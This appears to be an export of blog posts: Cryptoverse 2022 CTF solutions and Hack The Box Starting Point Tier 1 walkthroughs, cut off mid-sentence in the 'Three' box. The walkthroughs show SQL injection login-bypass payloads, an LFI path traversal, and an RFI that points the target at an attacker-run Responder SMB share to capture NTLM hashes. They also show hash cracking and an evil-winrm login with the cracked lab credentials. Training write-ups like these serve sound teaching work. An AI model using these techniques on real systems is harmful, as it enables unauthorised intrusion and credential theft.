[{"content":"This past weekend, I joined Shellphish for a last minute CTF called Cryptoverse\nWhile I\u0026rsquo;m still a crypto n00b, I spent a few hours gathering some flags for the team.\nCrypto Warmup 1 293 solves / 107 points Decode the following ciphertext: cGlwZ3N7cG5yZm5lXzY0X3Nnan0=.\nRemember: CyberChef is your friend.\nThe ciphertext for this challenge had the distinct appearance of base64. The output format was correct, perhaps a simple rotation cipher such as ROT13 will help. This gets us our flag.\nflag: cvctf{caesar_64_ftw}\nWarmup 2 274 solves / 113 points First described by Giovan Battista Bellaso in 1553, this cipher is easy to understand and implement, but it resisted all attempts to break it until 1863, three centuries later.\nRemember: The Key to success is determination.\nfzvxw{hqtegmfr_lw_msf_scrslg_kvwlhyk_fpr_kxg?}\nIf the given key and flag didn\u0026rsquo;t give it away, a quick search could tell you this is likely a Vigenère cipher.\nThrow that in CyberChef and get the flag.\nflag: cvctf{vigenere_is_too_guessy_without_the_key?}\nWarmup 3 313 solves / 102 points You should recognize this instantly.\n-.-. \u0026hellip;- -.-. - ..-. \u0026ndash; \u0026mdash;\u0026ndash; .-. \u0026hellip;.. \u0026hellip;\u0026ndash; .. \u0026hellip; -. \u0026mdash;\u0026ndash; - \u0026hellip;.. \u0026mdash;\u0026ndash; ..-. ..- -.\nNote: Add { and } around the flag. Flag is all lower case.\nDots and dashes screams Morse code. dcode.fr if a great tool for all things decoding, including morse code.\nflag: cvctf{m0r53isn0tfun}\nWarmup 4 73 solves / 387 points Last warmup. You should get it fast if you use any social media.\nＩn sｃｉencｅ fіctіοｎ ｍetａνerse ｉs ｉtｅrａtiｏｎоf the Iｎternｅｔ as a sⅰｎgｌe, universal and immersive virtual world that is facilitated by the use of virtual reality and augmented reality headsets.\nNote: Wrap the message you decoded in cvctf{}.\nNote 2: This challenge involves some steganography tool related to a social media.\nFor this challenge, I tried several things before ultimately being successful. I thought maybe it would have to do with zero-width characters and tried tools like Stegsnow with no luck.\nEventually I found a Twitter Secret Message tool that gave the flag.\nflag: cvctf{secretsaretobeh1dd3n}\nSubstitution 240 solves / 129 points Substitution is a cryptographic technique where a plaintext is replaced by a ciphertext. The ciphertext is a substitution of the plaintext.\nHere is a very simple CTF-related substitution cipher. Find out the flag.\nHxpkdiz kcz Osxe ja x apzhjxs ljvr go jvogimxkjgv azhdijkf hgmpzkjkjgva. Kcziz xiz kcizz hgmmgv kfpza, Uzgpxirf, Xkkxhl Rzozvhz xvr mjyzr. Jo fgd cxwz ojedizr gdk kcz xqgwz mzaaxez, cziz ja fgdi osxe, pszxaz xrr hdisf qixhlzka qzogiz adqmjaajgv: hwhkoxwzifajmpszadqakjkdkjgv\nFor this challenge, I realized hwhkoxwzifajmpszadqakjkdkjgv likely was the flag, hence the first hwhko should map to cvctf. After a little trial and error targeting 1 or 2 letter words, I decrypted with the following:\n1 2 Plaintext: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ Ciphertext: sxhugyocritkmxfpbdlxxnvaxeXXXXXXXCXITXXXFXXDXXJXXAXX Later, I found out quipquip can solve this for us.\nflag: cvctf{averysimplesubstitution}\nCyberMania 42 solves / 443 points I got this piece of ciphertext from my friend who is a Cyber Mania. It must have hidden something\u0026hellip;\nfile: secret.txt\nsecret.txt contains:\n1 NDAgNmIgNzEgNmEgNjkgM2EgMzIgM2QgNDIgM2YgM2QgNzUgMjcgNjIgNmEgM2QgNWQgNjUgMmQgNWMgM2MgNjMgMjggM2IgNzMgM2MgNDEgNDkgNWQgMzUgM2IgNDQgNTcgMzggNzAgM2IgMmYgNDMgMjYgNDIgM2EgMzAgMjggMmMgMmEgNDAgM2IgNTMgNGEgNTYgM2MgMjkgNmQgNTUgMzYgM2EgMmMgMmMgMzQgMmQgNDAgMzkgM2YgMjEgNDAgM2MgNWYgMmMgNzQgNjEgNDEgMzQgNGIgNWIgMjQgM2UgMjMgNjYgNGUgM2IgNDAgNmIgNzAgMjIgNzUgM2QgNWYgNjcgNjAgNTcgM2QgNjEgNDYgNTUgNGIgNDEgMzggNTEgMjEgNmUgM2IgNjUgNmYgNTEgMjkgM2QgMjUgNDcgNzIgMjggNDAgMzcgMzMgNTMgMjMgM2QgMjUgM2YgNzEgMjEgM2EgMmUgNGIgMzQgNTggNDEgMzggMzQgNTMgNDkgM2QgNWQgNDAgNmEgNjkgM2MgMjggNGIgNmUgNjYgM2EgMmUgNDkgMzAgM2QgMzkgNjkgNTkgNWYgM2YgM2MgNjAgNGYgMmEgNjAgM2MgMmEgMjkgNWIgNjMgNDEgMzggNGYgNjUgMzUgMzkgNjkgNTAgMmUgNWUgM2IgNjYgMmIgNGYgM2MgM2EgNDkgNjYgMzUgM2EgMzkgNmQgNTQgNjUgNmUgM2QgNWQgNTQgNGEgNzEgM2MgMjkgNjQgMjQgNjYgM2QgMjkgNGMgNTcgNGUgNDAgNmYgNzUgMzMgNDggM2QgNTkgNGYgNDEgNjcgNDAgM2MgNzQgNGYgNWMgM2EgMmUgMzcgNjAgMzAgM2IgNjYgMjMgNDcgNjYgM2QgMjUgMjQgNTAgNDUgM2QgNzQgNjkgNTEgNDQgM2MgMjggMzkgNjIgM2YgM2UgMjYgMzggMmUgMzUgM2MgNDMgNDMgMjIgNDcgM2IgNGEgNWQgMzYgNGMgM2UgMjIgM2EgNDcgNGMgM2IgNDggM2YgMzcgNjggM2IgMmYgNGEgNmMgNWEgM2IgNjUgNjYgNGIgNTkgM2EgNDkgNjQgNmMgNmEgM2QgMjcgMjUgNDMgNzUgM2IgNDYgNDYgMmQgMjMgM2MgNDUgNDMgNmUgNmIgM2MgNDUgMzQgMzUgNzMgM2QgMjYgNjEgMjEgM2QgM2IgNDggMzUgNTMgNjcgNDAgMzkgNDAgMjYgNWMgMzkgNjYgMjQgNjAgNWIgM2QgNWQgNTIgNzQgM2IgNDAgNmYgNmMgMzkgNDMgNDEgNGYgNGIgMjEgNTMgM2MgMmEgMzIgNjEgNWUgNDAgMzcgM2MgNjUgMjUgNDAgNTQgNDggNGUgMzEgM2EgMzIgNDYgNjAgNGIgM2UgMjMgNjUgMzAgNmUgM2MgMjggMjcgNGEgNzUgM2MgNWYgMmMgNTEgMjIgNDAgNzIgMjIgNTggNmUgM2IgMmQgMjUgNGMgMjYgMzkgNjkgNTAgNzEgMjggNDAgM2IgMzkgM2QgNTYgM2MgMjkgNjQgNWIgNGUgNDEgNGYgNGIgMzkgNjAgM2QgNWYgNzAgNTAgNWQgNDEgNTMgNmEgMmIgNTcgM2QgNzQgNzMgMzMgMjQgM2UgMjYgNGEgMmIgMzMgM2MgNjAgNjkgMmIgMzIgNDAgMzcgNGUgNjQgNDYgM2IgNDQgNDMgNTggM2QgM2IgMmYgNDMgMjMgNmYgM2IgNWYgNTYgMmEgNjMgM2MgNWUgNzAgMjggNDYgNDAgNmYgNWEgNDUgMmYgNDAgNTAgNWYgNzMgNTggNDAgNTQgNWEgNjIgNjUgM2QgMjkgMjkgNTAgNmMgNDEgMzggM2QgNjUgMjggNDEgMzYgM2MgNGQgMzMgNDAgMzcgNGYgNzMgNTQgNDEgNGYgNmYgNTEgNTAgNDEgMzkgNTUgMzEgMjI= After a bit of CyberChef magic\u0026hellip; These emoji\u0026rsquo;s seemed suspicious, so I found cryptoji and it popped out the flag.\nflag: cvctf{3m0j1_c4n_L34K_7h1ng5}\nRSA 1 183 solves / 182 points The n is so large that it\u0026rsquo;s not possible to factor it. Or is it?\nn = 0x7c05a45d02649367ebf6f472663119777ce5f9b3f2283c7b03471e9feb1714a3ce9fa31460eebd9cd5aca7620ecdb52693a736e2fcc83d7909130c6038813fd16ef50c5ca6f491b4a8571289e6ef710536c4615604f8e7aeea606d4b5f59d7adbec935df23dc2bbc2adebbee07c05beb7fa68065805d8c8f0e86b5c3f654e651\ne = 0x10001\nct = 0x35b63f7513dbb828800a6bcd708d87a6c9f33af634b8006d7a94b7e3ba62e6b9a1732a58dc35a8df9f7554e1168bfe3de1cb64792332fc8e5c9d5db1e49e86deb650ee0313aae53b227c75e40779a150ddb521f3c80f139e26b2a8880f0869f755965346cd28b7ddb132cf8d8dcc31c6b1befc83e21d8c452bcce8b9207ab76e\nfactordb allows us to \u0026ldquo;factorize\u0026rdquo; n to find p and q. The rest is plug and chug.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/usr/bin/env python3 from Crypto.Util.number import inverse, long_to_bytes # Given: n = 0x7c05a45d02649367ebf6f472663119777ce5f9b3f2283c7b03471e9feb1714a3ce9fa31460eebd9cd5aca7620ecdb52693a736e2fcc83d7909130c6038813fd16ef50c5ca6f491b4a8571289e6ef710536c4615604f8e7aeea606d4b5f59d7adbec935df23dc2bbc2adebbee07c05beb7fa68065805d8c8f0e86b5c3f654e651 e = 0x10001 ct = 0x35b63f7513dbb828800a6bcd708d87a6c9f33af634b8006d7a94b7e3ba62e6b9a1732a58dc35a8df9f7554e1168bfe3de1cb64792332fc8e5c9d5db1e49e86deb650ee0313aae53b227c75e40779a150ddb521f3c80f139e26b2a8880f0869f755965346cd28b7ddb132cf8d8dcc31c6b1befc83e21d8c452bcce8b9207ab76e # FactorDB the given \u0026#39;n\u0026#39; p = 8156072525389912369788197863285751656042515380911795404436333529629416084362735262281722179416240983448945672233749861517470671156357917601583268804973543 q = 10678085245814899631026086851678635624044610674331494223434578587048178556659016077336866548714220013612176819608742965144962254942844889066032236627832071 assert n == p*q phi = (p-1)*(q-1) d = inverse(e, phi) m = pow(ct, d, n) print(long_to_bytes(m)) flag: cvctf{f4c70rDB_15_p0w3rfu1}\nReverse Baby Reverse 239 solves / 130 points Baby warmup.\nfiles: chall\nAfter running the program, it gave the output:\n1 2 You do not really need to run the program... The flag is: cvctf{7h15_15_4_f4k3_fl4g} So, I ran: strings chall | grep cvctf. This gave the flag.\nflag: cvctf{r3v3r53_15_4w350m3}\nBasic Transforms 97 solves / 337 points Basic JS for you to tackle.\nfile: app.js\napp.js contains:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var readline = require(\u0026#39;readline\u0026#39;); var Crypto = require(\u0026#39;vigenere\u0026#39;); var rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: true }); rl.on(\u0026#39;line\u0026#39;, function(line){ if (line.length == 20 \u0026amp;\u0026amp; line.startsWith(\u0026#34;cvctf{\u0026#34;) \u0026amp;\u0026amp; line.endsWith(\u0026#34;}\u0026#34;)) { var cat = Crypto.encode(line.substring(6, line.length - 1), \u0026#34;nodejsisfun\u0026#34;).split(\u0026#39;\u0026#39;).map(function(c) { return String.fromCharCode(c.charCodeAt(0) + 1); }).join(\u0026#39;\u0026#39;); if (Buffer.from(cat.split(\u0026#34;\u0026#34;).reverse().join(\u0026#34;\u0026#34;)).toString(\u0026#39;base64\u0026#39;) == \u0026#34;QUlgNGoxT2A2empxMQ==\u0026#34;) { console.log(\u0026#34;Correct!\u0026#34;); } } }); For this challenge, I simply used CyberChef again and reversed the cipher.\nHowever, I wasn\u0026rsquo;t getting the full flag upon decoding the Vigenère cipher. So, I reverted back to js using the runkit environment.\nflag: cvctf{0bfu5_N0d3_H@}\nMisc iKUN1 https://www.youtube.com/watch?v=w8bidbK0PI\nFind the flag for iKUN 1, already wrapped in flag format.\nHint: Please find me (CryptoverseCTF) on THE platform for code repositories hosting.\nNote: The YouTube link is unrelated to solving the challenge.\nTHE platform seemed likely to be Github. I was quickly able to find the account, then found a repo with a cvctf{fake_flag_but_correct_repo} bio. I checked the commit history and found the flag:\nflag: cvctf{git_reveals_everything}\nNot Georainbolt 37 solves / 451 points Georainbolt is able to guess the location on Google Map in 0.1 seconds. Can you do it in a second?\nGiven an IP address or a coordinate, tell me which city it is in. All answers are case-insensitive. You will need a space between words, such as \u0026ldquo;new york city\u0026rdquo;.\nFor simplicity, I will make it easy. There are 50 questions and you only need to achieve an accuracy of more than 50% to get the flag!\nnc 137.184.215.151 22606\nAfter connecting, the challenge will prompt the user to guess the city based on IP or Coordinate (as shown below). If you answer in more than 1 second, it\u0026rsquo;s automatically \u0026ldquo;Wrong.\u0026rdquo;\n1 2 3 4 5 IP: 2.145.91.238 City: Coordinate (lat, lon): 45.3747, -75.5647 City: We can script this to solve!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #!/usr/bin/env python3 import time import ipinfo from pwn import * from geopy.geocoders import Nominatim # init ipinfo at = \u0026#39;\u0026lt;REDACTED\u0026gt;\u0026#39; h = ipinfo.getHandler(at) # init geo locator geolocator = Nominatim(user_agent=\u0026#34;geoapiExercises\u0026#34;) r = remote(\u0026#39;137.184.215.151\u0026#39;, 22606) r.recvuntil(b\u0026#39;wrong.\\n\u0026#39;) log.info(\u0026#39;Solving...\u0026#39;) for i in range(50): time.sleep(0.2) q = r.recvuntil(b\u0026#39;City:\u0026#39;) if b\u0026#39;IP\u0026#39; in q: ip = q.split(b\u0026#39;IP: \u0026#39;)[-1].split(b\u0026#39;\\n\u0026#39;)[0].decode() d = h.getDetails(ip) r.sendline(d.city.encode()) else: coor = q.split(b\u0026#39;lon): \u0026#39;)[-1].split(b\u0026#39;\\n\u0026#39;)[0].decode() location = geolocator.reverse(coor) try: city = location.raw[\u0026#39;address\u0026#39;][\u0026#39;city\u0026#39;] except: city = \u0026#39;failed\u0026#39; r.sendline(city.encode()) r.interactive() flag: cvctf{4r3_y0u_4_R34L_Ge@r41nB0L7?}\n","permalink":"https://woadey.lol/posts/cv22/","summary":"\u003cp\u003eThis past weekend, I joined \u003ca href=\"https://shellphish.net/\"\u003eShellphish\u003c/a\u003e for a last minute CTF called Cryptoverse\u003c/p\u003e","title":"Cryptoverse 2022"},{"content":"Short writeups for each of the Starting Point boxes on HTB - Tier 1\nAppointment nmap 1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.92 scan initiated Tue Oct 25 20:48:19 2022 as: nmap -sC -sV -oA nmap/appointment 10.129.17.225 Nmap scan report for 10.129.17.225 Host is up (0.11s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Login |_http-server-header: Apache/2.4.38 (Debian) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 25 20:48:30 2022 -- 1 IP address (1 host up) scanned in 11.56 seconds http Since port 80 is open, let\u0026rsquo;s check the browser to see what the IP address gives us.\nLet\u0026rsquo;s try a few combinations of usernames and passwords first such as admin, root, password, etc.\nPerhaps this isn\u0026rsquo;t the point of entry, let\u0026rsquo;s try to find any useful subdirectories using Gobuster\ngobuster gobuster (sudo apt install gobuster) is a tool that bruteforces urls in order to find subdomains, subdirectories, and files. Let\u0026rsquo;s run a simple scan on this IP and store the output in gobuster.out for later reference.\ngobuster dir -u http://10.129.17.225 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster.out -z\n(note: sudo apt install seclists if you do not already have this directory)\ncommand tags:\ndir: directories/files search mode -u: url -w: specify a wordlist -o: specify output file -z: only display hits (not other progress) This will give us the following output: After looking at these subdirectories, nothing glaring stood out.Perhaps we can pivot back to the login page and try SQL Injection.\nSQL SQL (Structured Query Language) is a programming language used in order to store, manipulate, or retrive data in databases. SQL Injection (sqli) is a technique used to inject SQL commands via the front end to leak information from the database.\nIt\u0026rsquo;s worth trying a few basic sqli before breaking out the big guns like sqlmap. Let\u0026rsquo;s try a few from this Github I found Googling \u0026ldquo;sqli payloads\u0026rdquo;. Let\u0026rsquo;s go to the section of sqli payloads for bypassing authentication (Auth Bypass Payloads) \u0026ndash; they usually have a format similar to ' OR 1=1 or admin' --. Just throw them into the username and password fields and hope one works.\n'-': SUCCESS ' or ''-': failed ' or \u0026quot;: failed -- or #: failed ' OR '1: SUCCESS As you can see, it takes a bit of trial and error, hence how automation (through something like sqlmap) can prove useful!\nQuestions What does the acronym SQL stand for? Structured Query Language What is one of the most common type of SQL vulnerabilities? SQL Injection What does PII stand for? Personally Identifiable Information What does the OWASP Top 10 list name the classification for this vulnerability? A03:2021-Injection What service and version are running on port 80 of the target? Apache httpd 2.4.38 ((Debian)) What is the standard port used for the HTTPS protocol? 443 What is one luck-based method of exploiting login pages? brute-forcing What is a folder called in web-application terminology? directory What response code is given for \u0026ldquo;Not Found\u0026rdquo; errors? 404 What switch do we use with Gobuster to specify we\u0026rsquo;re looking to discover directories, and not subdomains? dir What symbol do we use to comment out parts of the code? # flag: e3d0796d002a446c0e622226f42e9672\nSequel nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # Nmap 7.92 scan initiated Tue Oct 25 22:42:52 2022 as: nmap -sC -sV -oA nmap/sequel 10.129.152.89 Nmap scan report for 10.129.152.89 Host is up (0.077s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 3306/tcp open mysql? |_sslv2: ERROR: Script execution failed (use -d to debug) | mysql-info: | Protocol: 10 | Version: 5.5.5-10.3.27-MariaDB-0+deb10u1 | Thread ID: 66 | Capabilities flags: 63486 | Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsTransactions, ConnectWithDatabase, IgnoreSigpipes, ODBCClient, FoundRows, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins | Status: Autocommit | Salt: fxIBQOv\u0026amp;Xj-\u0026gt;/n`tHL\u0026#34;c |_ Auth Plugin Name: mysql_native_password |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 25 22:46:15 2022 -- 1 IP address (1 host up) scanned in 203.10 seconds mysql Since port 3306 is open, lets take a look into connecting to mysql (sudo apt update \u0026amp;\u0026amp; sudo apt install mysql*) - an open-source relational database management system.\nWe can run the following command and try for root right away:\nmysql -h 10.129.152.89 -u root\ncommand tags:\n-h: host IP -u: specified user Bingo!\nNow we can just run a few sql commands and profit:\nshow databases; use htb; show tables; select * from config;\nQuestions What does the acronym SQL stand for? Structured Query Language During our scan, which port running mysql do we find? 3306 What community-developed MySQL version is the target running? MariaDB What switch do we need to use in order to specify a login username for the MySQL service? -u Which username allows us to log into MariaDB without providing a password? root What symbol can we use to specify within the query that we want to display everything inside a table? * What symbol do we need to end each query with? ; flag: 7b4bec00d1a39e3dd4e021ec3d915da8\nCrocodile nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # Nmap 7.92 scan initiated Tue Oct 25 23:11:51 2022 as: nmap -sC -sV -oA nmap/crocodile 10.129.228.114 Nmap scan report for 10.129.228.114 Host is up (0.080s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 33 Jun 08 2021 allowed.userlist |_-rw-r--r-- 1 ftp ftp 62 Apr 20 2021 allowed.userlist.passwd | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.82 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Smash - Bootstrap Business Template |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 25 23:12:04 2022 -- 1 IP address (1 host up) scanned in 12.82 seconds ftp ftp is open with anonymous mode allowed, so let\u0026rsquo;s scope it out.\nallowed.userlist:\n1 2 3 4 aron pwnmeow egotisticalsw admin allowed.userlist.password:\n1 2 3 4 root Supersecretpassword1 @BaASD\u0026amp;9032123sADS rKXM59ESxesUFHAd http Well we have users and passwords, let\u0026rsquo;s check the website to see if something will take these credentials (like a login page).\nAfter clicking around, nothing seemed promising. Let\u0026rsquo;s throw it in gobuster to see if we can\u0026rsquo;t find a login page.\ngobuster We\u0026rsquo;ve done this before! (see above)\ngobuster dir -u http://10.129.228.114 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.228.114 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/10/25 23:30:31 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 317] [--\u0026gt; http://10.129.228.114/assets/] /css (Status: 301) [Size: 314] [--\u0026gt; http://10.129.228.114/css/] /js (Status: 301) [Size: 313] [--\u0026gt; http://10.129.228.114/js/] /dashboard (Status: 301) [Size: 320] [--\u0026gt; http://10.129.228.114/dashboard/] =============================================================== 2022/10/25 23:31:11 Finished =============================================================== dashboard seems interesting\u0026hellip; we get redirected to login.php!\nGoing for the throat with the admin:rKXM59ESxesUFHAd grants us access and the flag.\nQuestions What nmap scanning switch employs the use of default scripts during a scan? -sC What service version is found to be running on port 21? vsftpd 3.0.3 What FTP code is returned to us for the \u0026ldquo;Anonymous FTP login allowed\u0026rdquo; message? 230 What command can we use to download the files we find on the FTP server? get What is one of the higher-privilege sounding usernames in the list we retrieved? admin What version of Apache HTTP Server is running on the target host? 2.4.41 What is the name of a handy web site analysis plug-in we can install in our browser? Wappalyzer What switch can we use with gobuster to specify we are looking for specific filetypes? -x What file have we found that can provide us a foothold on the target? login.php flag: c7110277ac44d78b6a9fff2232434d16\nResponder nmap For this scan, I added the tags -p- to scan all ports since the top 1000 had no hits and -T5for the insane level to increase speed.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Nmap 7.92 scan initiated Tue Oct 25 23:51:23 2022 as: nmap -p- -sC -sV -T5 -oA nmap/responder 10.129.245.210 Nmap scan report for 10.129.245.210 Host is up (0.21s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Oct 26 00:03:07 2022 -- 1 IP address (1 host up) scanned in 703.75 seconds http Port 80 is open so let\u0026rsquo;s scope out the site!\nLooks like the IP is getting redirected to unika.htb. Let\u0026rsquo;s add this to /etc/hosts to map the hostname to the IP address to help DNS.\n/etc/hosts:\n1 2 3 4 5 6 7 8 127.0.0.1 localhost 127.0.1.1 kali 10.129.245.210 unika.htb # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters That\u0026rsquo;s better. After clicking around, something stood out after changing the language to French - the url changed to http://unika.htb/index.php?page=french.html. page is calling a file on the server, but can\u0026rsquo;t we just change this file to be something else? Say, /etc/hosts:\nhttp://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts ⬇️⬇️⬇️\n1 2 3 4 5 6 7 8 9 # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a \u0026#39;#\u0026#39; symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost Now that we know we can access files on the server, an LFI (Local File Incluse) vulnerability, perhaps we there is an RFI (Remote File Incluse) vulnerability. From our nmap, we know that the server hosting this page is a Windows machine. So, in order for us to test this RFI vulnerability, we will first need to learn a bit about NTLM.\nNTLM NTLM (New Technology Lan Manager) is essentially a network security manager in Windows that provides authentication, integrity, and confidentiality. Noteably, it is a single sign-on (SSO) which allows requires users to only be authenticated once. More details of NTLM and the authentication process can be found on Crowdstrike. Basically, there are tools - such as Responder - which allow us to listen in on the NTLM authentication and capture the NetNTLMv2 hash. If we are able to crack this hash, we can then gain access to the server. Let\u0026rsquo;s give it a go.\nResponder Responder (git clone https://github.com/lgandx/Responder), is a tool that can simulate many attacks. In this case, we will use it as a malicious SMB server to capture the NetNTLMv2 hash. This can be done by:\nsudo python3 Responder.py -I tun0\nNow we will have the server interact with this SMB server (hosted on your client IP - mine being 10.10.14.165) by changing the URL in our browser to:\nhttp://unika.htb/index.php?page=//10.10.14.165/any_file_name\nHash acquired!\nWe just need to crack it.\njohn the ripper john (john the ripper) is one commonly used hash cracking tools. Let\u0026rsquo;s copy this hash from Responder and throw it into a text file such as hashed.txt. Let john do the rest:\njohn -w=/usr/share/wordlists/rockyou.txt hashed.txt\n1 2 3 4 5 6 7 8 Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status badminton (Administrator) 1g 0:00:00:00 DONE (2022-10-25 23:58) 100.0g/s 409600p/s 409600c/s 409600C/s slimshady..oooooo Use the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably Session completed. There we go\u0026hellip; Administrator:badminton. Time to exploit.\nWinRM winrm (Windows Remote Management) is a protocol that allows devices to access a system remotely. evil-winrm is a tool that allows us to connect to a windows machine and still be able to use Powershell on Linux.\nevil-winrm -i 10.129.245.210 -u Administrator -p badminton\nWe are in. Now we can run a PowerShell command to look for the flag so we don\u0026rsquo;t have to!\nGet-ChildItem -Path C:\\ -Filter flag.txt -Recurse\nBox popped.\nQuestions When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb Which scripting language is being used on the server to generate webpages? php What is the name of the URL parameter which is used to load different language versions of the webpage? page Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: \u0026ldquo;french.html\u0026rdquo;, \u0026ldquo;//10.10.14.6/somefile\u0026rdquo;, \u0026ldquo;../../../../../../../../windows/system32/drivers/etc/hosts\u0026rdquo;, \u0026ldquo;minikatz.exe\u0026rdquo; ../../../../../../../../windows/system32/drivers/etc/hosts Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: \u0026ldquo;french.html\u0026rdquo;, \u0026ldquo;//10.10.14.6/somefile\u0026rdquo;, \u0026ldquo;../../../../../../../../windows/system32/drivers/etc/hosts\u0026rdquo;, \u0026ldquo;minikatz.exe\u0026rdquo; //10.10.14.6/somefile What does NTLM stand for? New Technology Lan Manager Which flag do we use in the Responder utility to specify the network interface? -I There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?. John The Ripper What is the password for the administrator user? badminton We\u0026rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 5985 flag: ea81b7afddd03efaa0945333ed147fac\nThree nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Thu Oct 27 13:35:55 2022 as: nmap -sC -sV -oA nmap/three -T4 10.129.37.145 Nmap scan report for 10.129.37.145 Host is up (0.072s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA) | 256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA) |_ 256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Toppers |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Oct 27 13:36:06 2022 -- 1 IP address (1 host up) scanned in 10.71 seconds http After looking around at the website, there were two main things that stood out.\nEmail: mail@thetoppers.htb gives us the domain thetoppers.htb Dropping a note in the #content section gives us http://10.129.37.145/action_page.php?Name=test1\u0026amp;Email=test2\u0026amp;Message=test3 We can add thetoppers.htb to /etc/hosts and check for subdirectories and subdomains.\ngobuster This section caused problems for me.\nsubdirectories\nFirst, I looked for subdirectories:\ngobuster dir -u http://10.129.37.145 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\nThis proved unhelpful with only the /images directory found.\nsubdomains\nI then tried running gobuster to look for subdomains hosted on the same IP using the vhost 